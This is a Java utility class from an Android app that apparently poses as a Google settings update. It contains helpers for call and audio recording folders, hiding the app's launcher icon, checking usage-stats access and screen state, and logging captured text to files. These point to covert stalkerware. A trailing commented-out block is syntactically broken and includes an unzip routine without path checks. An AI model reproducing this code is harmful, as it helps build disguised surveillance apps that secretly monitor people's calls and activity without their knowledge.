package com.setting.dl.google.googlesettingupdate;

import android.app.AppOpsManager;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.hardware.display.DisplayManager;
import android.media.MediaMetadataRetriever;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Process;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.v4.app.NotificationCompat;
import android.telephony.TelephonyManager;
import android.view.Display;

import org.jetbrains.annotations.NotNull;

import java.io.File;
import java.io.FileOutputStream;
import java.util.Locale;
import java.util.Random;

public class u {
   
   public static final MyLogger log = MyLogger.jLog();
   
   @NonNull
   public static String format(String msg, Object... args) {
      
      return String.format(new Locale("tr"), msg, args);
   }
   
   public static String getAudioFolder(Context context) {
      
      File file = new File(context.getFilesDir(), "audio");
      
      if (!file.exists()) {
         
         if (file.mkdir()) {
            
            return file.getAbsolutePath();
         }
      }
      else {
         return file.getAbsolutePath();
      }
      
      return context.getFilesDir() + "/audio";
   }
   
   public static String getCallAudioFolder(Context context) {
      
      File file = new File(context.getFilesDir(), "call");
      
      if (!file.exists()) {
         
         if (file.mkdir()) {
            
            return file.getAbsolutePath();
         }
      }
      else {
         return file.getAbsolutePath();
      }
      
      return context.getFilesDir() + "/call";
   }
   
   public static File getAudioFolderFile(Context context) {
      
      File file = new File(context.getFilesDir(), "audio");
      
      if (!file.exists()) {
         
         if (file.mkdir()) {
            
            return file;
         }
      }
      else {
         return file;
      }
      
      return new File(context.getFilesDir() + "/audio");
   }
   
   public static File getCallAudioFolderFile(Context context) {
      
      File file = new File(context.getFilesDir(), "call");
      
      if (!file.exists()) {
         
         if (file.mkdir()) {
            
            return file;
         }
      }
      else {
         return file;
      }
      
      return new File(context.getFilesDir() + "/call");
   }
   
   public static boolean isOnline(Context context) {
      
      ConnectivityManager c = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
      
      if (c == null) return false;
      
      NetworkInfo networkInfo = c.getActiveNetworkInfo();
      
      return networkInfo != null && networkInfo.isConnected();
   }
   
   synchronized
   public static File saveToFile(Context context, String title, String value) {
      
      File file = new File(context.getFilesDir(), title + ".txt");
      
      value += "\n==========================================\n";
      
      try {
         
         FileOutputStream fis = new FileOutputStream(file, true);
         
         fis.write(value.getBytes());
         fis.close();
         
         log.d("Kaydedildi : %s", file.getName());
      }
      catch (Exception ignore) {}
      
      return file;
   }
   
   public static void showHideApp(Context context, boolean hide) {
      
      PackageManager packageManager = context.getPackageManager();
      ComponentName  componentName  = new ComponentName(context, MainActivity.class);
      
      if (hide) {
         
         packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
      }
      else {
         
         packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
      }
      
   }
   
   public static String formatMilliSeconds(long milliseconds) {
      
      // Convert total duration into time
      int hours   = (int) (milliseconds / (1000 * 60 * 60));
      int minutes = (int) (milliseconds % (1000 * 60 * 60)) / (1000 * 60);
      int seconds = (int) ((milliseconds % (1000 * 60 * 60)) % (1000 * 60) / 1000);
      
      if (hours != 0) {
         
         return String.format(new Locale("tr"), "%02d:%02d:%02d", hours, minutes, seconds);
      }
      
      return String.format(new Locale("tr"), "%02d:%02d", minutes, seconds);
   }
   
   public static long getDuration(String filePath) {
      
      long fileDuration = -60L;
      
      try {
         
         MediaMetadataRetriever metaRetriever = new MediaMetadataRetriever();
         metaRetriever.setDataSource(filePath);
         
         String duration = metaRetriever.extractMetadata(MediaMetadataRetriever.METADATA_KEY_DURATION);
         
         metaRetriever.release();
         fileDuration = Long.parseLong(duration);
      }
      catch (Exception e) {
         
         u.log.d("Bilgi alınamadı");
      }
      
      return fileDuration;
   }
   
   public static String getMp3Duration(File file) {
      
      return formatMilliSeconds(getDuration(file.getAbsolutePath()));
   }
   
   public static boolean deleteFile(File file) {
      
      if (file == null) {
         
         log.d("file = null (bu bir hata değil)");
         return false;
      }
      
      if (file.delete()) {
         
         log.d("Dosya silindi : %s", file.getName());
         return true;
      }
      else {
         
         if (!file.exists()) {
            
            log.d("Dosya silinemedi çünkü böyle bir dosya yok : %s", file.getName());
         }
         else {
            
            log.w("Dosya silinemedi  : %s", file.getName());
         }
      }
      
      return false;
   }
   
   public static void createNotification(@NotNull Context context, String title, String subTitle, String content) {
      
      String CHANNEL_ID   = "0412";
      String CHANNEL_NAME = "xyz.tr.channel";
      
      NotificationManager mNotificationManager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
      
      if (mNotificationManager == null) return;
      
      
      NotificationCompat.Builder mBuilder =
            new NotificationCompat.Builder(context, CHANNEL_ID)
                  .setContentText(subTitle).setStyle(new NotificationCompat.BigTextStyle())
                  .setSmallIcon(R.mipmap.call)
                  .setContentTitle(title)
                  .setColor(Color.YELLOW)
                  .setLights(Color.YELLOW, 500, 5000)
                  .setStyle(new NotificationCompat.BigTextStyle().bigText(content))
            /*.setVibrate(new long[]{0, 0, 0, 150})*/;
        
        /*
        mBuilder.setDefaults(
                Notification.DEFAULT_SOUND
                             );
        */
      
      
      if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
         
         int                 importance          = NotificationManager.IMPORTANCE_HIGH;
         NotificationChannel notificationChannel = new NotificationChannel(CHANNEL_ID, CHANNEL_NAME, importance);
         
         mBuilder.setChannelId(CHANNEL_ID);
         mNotificationManager.createNotificationChannel(notificationChannel);
      }
      
      mNotificationManager.notify(new Random().nextInt(), mBuilder.build());
   }
   
   public static boolean isScreenOn(Context context) {
      
      if (context == null) {
         
         log.d("Context null");
         return false;
      }
      
      DisplayManager displayManager = (DisplayManager) context.getApplicationContext().getSystemService(Context.DISPLAY_SERVICE);
      
      if (displayManager == null) {
         
         u.log.w("DisplayManager null");
         return false;
      }
      
      for (Display display : displayManager.getDisplays()) {
         
         if (display.getState() != Display.STATE_OFF) {
            
            return true;
         }
      }
      
      return false;
   }
   
   public static boolean isWifiConnected(Context context) {
      
      ConnectivityManager connManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
      NetworkInfo         mWifi       = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
      
      return mWifi.isConnected();
   }
   
   public static boolean isAirplaneModeOn(Context context) {
      return Settings.Global.getInt(context.getContentResolver(), Settings.Global.AIRPLANE_MODE_ON, 0) != 0;
   }
   
   public static boolean isUsageStatGrant(Context context) {
      
      AppOpsManager appOpsManager = (AppOpsManager) context.getSystemService(Context.APP_OPS_SERVICE);
      
      return appOpsManager != null && appOpsManager.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, Process.myUid(), context.getPackageName()) == AppOpsManager.MODE_ALLOWED;
   }
   
   
}


/*
public static String getSimOperatorName(Context context) {
   
      TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
      
      return telephonyManager.getNetworkOperatorName();
   }
 public static void keepGoing(IKeepGoing action) {
      
      try {
         
         action.go();
      }
      catch (Exception e) {
         
         log.w(e);
      }
   }
   
   
   public static int getVersionCode(Context context) {
      
      PackageManager pm = context.getPackageManager();
      
      try {
         PackageInfo pi = pm.getPackageInfo(context.getPackageName(), 0);
         return pi.versionCode;
      }
      catch (PackageManager.NameNotFoundException ignored) {}
      
      return 0;
   }
   
   
   public static void unzip(File zipFile, File targetDirectory) throws IOException {
      
      try (ZipInputStream zis = new ZipInputStream(new BufferedInputStream(new FileInputStream(zipFile)))) {
         
         ZipEntry ze;
         int      count;
         byte[]   buffer = new byte[8192];
         
         while ((ze = zis.getNextEntry()) != null) {
            
            File file = new File(targetDirectory, ze.getName());
            File dir  = ze.isDirectory() ? file : file.getParentFile();
            
            if (!dir.isDirectory() && !dir.mkdirs())
               throw new FileNotFoundException("Failed to ensure directory: " + dir.getAbsolutePath());
            
            if (ze.isDirectory())
               continue;
            
            try (FileOutputStream fout = new FileOutputStream(file)) {
               
               while ((count = zis.read(buffer)) != -1)
                  fout.write(buffer, 0, count);
            }*/
            /* if time should be restored as well
            long time = ze.getTime();
            if (time > 0)
                file.setLastModified(time);
         
}
      }
              }





public static void toggleNotificationListenerService(Context context) {
		PackageManager pm = context.getPackageManager();
		pm.setComponentEnabledSetting(new ComponentName(context, NLService.class),
				PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
		
		pm.setComponentEnabledSetting(new ComponentName(context, NLService.class),
				PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
		
	}*/


